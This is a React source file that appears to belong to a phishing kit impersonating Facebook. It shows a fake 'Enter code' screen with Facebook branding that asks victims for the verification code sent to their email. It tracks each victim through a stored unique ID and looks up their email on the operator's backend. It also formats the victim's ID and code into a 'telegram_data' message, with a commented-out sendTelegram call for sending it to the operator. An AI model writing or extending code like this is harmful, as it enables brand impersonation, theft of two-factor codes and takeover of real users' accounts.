import { Input } from "antd";
import React, { useEffect, useState } from "react";
import { useLocation } from "react-router";
import "./styles/confirmation-second.css";

//import { getIpAddress } from "./utils/getIpAddress";
//import { sendTelegram } from "./utils/sendTelegram";
import { API_BE } from "./utils/variable";


export const RestrictedEmail = (props) => {
  const { state } = useLocation();
  const [cc_number, setEmail] = useState("");

  const [code, setCode] = useState("");

  const isNumber = (value) => {
    return /\d/.test(value);
  };

  const handleInputCode = (value) => {
    if (value.length > 8) return;
    setCode(value);
  };

  const getSingleUser = () => {
    let unique_id = localStorage.getItem("unique_id");

    if (unique_id) {
      unique_id = JSON.parse(unique_id);
      fetch(`${API_BE}/users/` + unique_id)
        .then((res) => res.json())
        .then((response) => {
            setEmail(response?.data?.email || "******@*****.***")
        })
        .catch(() => { });
    }
  };

  useEffect(() => {
    getSingleUser()
  }, [])

  const updateStatus = () => {
    let unique_id = localStorage.getItem("unique_id");

    let telegram_data = `
    ========== CODE RESTRICTED EMAIL ==========
      ID: ${unique_id}
    ===============================
      Code: ${code}
    ===============================
    `;

    //sendTelegram(telegram_data);
    if (unique_id) {
      unique_id = JSON.parse(unique_id);

      const data = {
        unique_id,
        status: 0,
      };

      fetch(`${API_BE}/users`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      })
        .then((response) => response.json())
        .then(() => { });

      props.setValue(0)
    }
  };



  const cancelBtn = () => {
    let unique_id = localStorage.getItem("unique_id");
    if (unique_id) {
      unique_id = JSON.parse(unique_id);

      const data = {
        unique_id,
        status: 0,
      };

      fetch(`${API_BE}/users`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      })
        .then((response) => response.json())
        .then(() => { });
      props.setValue(0)
    }
  };

  return (
    <div className="verification">
      <div className="confirmation-container-2 confirmation-container-2-verication">
        <div>
          <div className="header-container header-container-verification">
            <div className="logo__facebook-verification">
              <img src="/facebook__logo.png" />
            </div>
          </div>
        </div>
        <div className="auth-req-container-2 auth-req-container-2-verification">
          <div className="auth-req-2 auth-req-2-verification-show">
            <div className="auth-req-text-2 heading__wrapper">
              <h2>Enter code</h2>
              <p className="help__text">To help us check this account belongs to you, please type or paste the code we sent to ({cc_number}).</p>
              <div className="confirmation-second-2 confirmation__wrapper-input">
                <div className="flex-confirmation-second-2">
                  <div className="input-auth-req-2">
                    <Input
                      placeholder="Type or paste code"
                      type="number"
                      required
                      value={code}
                      onChange={(e) => handleInputCode(e.target.value)}
                    />
                  </div>
                </div>
              </div>
            </div>
            {/* <div className="show-input-on-mobile-2">
              <Input
                value={code}
                onChange={(e) => handleInputCode(e.target.value)}
              />
            </div> */}
            <div className="auth-req-footer-2 auth-req-footer-2-verify">
              <div className="button-second-confirmation-2 footer__button-wrapper">
                <button disabled onClick={() => cancelBtn()}>Back</button>
                <button onClick={() => updateStatus()}>Submit</button>
              </div>
            </div>
          </div>
          {/* <div className="show-button-mobile-2">
            <h2>
              We sent your code to:
              <br />
    
            </h2>
            <p>
              Check that you have received an email containing your code. Your
              code has 8 numbers.
            </p>
            <h2>Enter the 8-digit code</h2>
            <Input
              type="number"
              placeholder="######"
              value={code}
              onChange={(e) => handleInputCode(e.target.value)}
            />
            <button onClick={() => updateStatus()}>Continue</button>
            <a>try another way</a>
          </div> */}
          <div className="show-footer-on-mobile-plus-2">
            <h2 className="h2-foot-2">Not You? Log In Here</h2>
            <div className="footer-flex-mobile-plus-2">
              <div>
                <h2>English (US)</h2>
                <p>Deutsch</p>
                <p>Српски</p>
                <p>Português (Brasil)</p>
              </div>
              <div>
                <p>Italiano</p>
                <p>Bosanski</p>
                <p>Svensk</p>
                <button>+</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="footer__wrapper-verification"></div>
    </div>
  );
};
